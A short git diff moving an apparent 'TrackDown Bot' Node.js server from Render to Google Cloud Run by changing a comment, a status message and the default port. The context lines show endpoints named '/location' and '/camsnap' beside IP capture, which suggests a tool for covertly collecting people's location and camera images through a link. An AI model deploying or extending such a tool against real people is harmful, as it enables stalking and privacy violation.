@@ -17,7 +17,7 @@ if (!botToken) {
 
 console.log('🤖 Bot token found:', botToken.substring(0, 10) + '...');
 
-// For Render, we can use polling since it supports long-running processes
+// For Cloud Run, we can use polling since it supports long-running processes
 const bot = new TelegramBot(botToken, {polling: true});
 
 // Test bot connection
@@ -175,7 +175,7 @@ async function createNew(cid){
 app.get("/", (req, res) => {
   var ip;
   if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  res.json({"ip":ip, "status": "TrackDown Bot is running on Render!", "hostURL": hostURL});
+  res.json({"ip":ip, "status": "TrackDown Bot is running on Google Cloud Run!", "hostURL": hostURL});
 });
 
 app.post("/location",(req,res)=>{
@@ -227,7 +227,8 @@ app.post("/camsnap",(req,res)=>{
   }
 });
 
-const PORT = process.env.PORT || 5000;
+// Cloud Run sets PORT environment variable
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`🚀 TrackDown Bot is running on port ${PORT}!`);
   console.log(`🌐 Web server: http://localhost:${PORT}`);
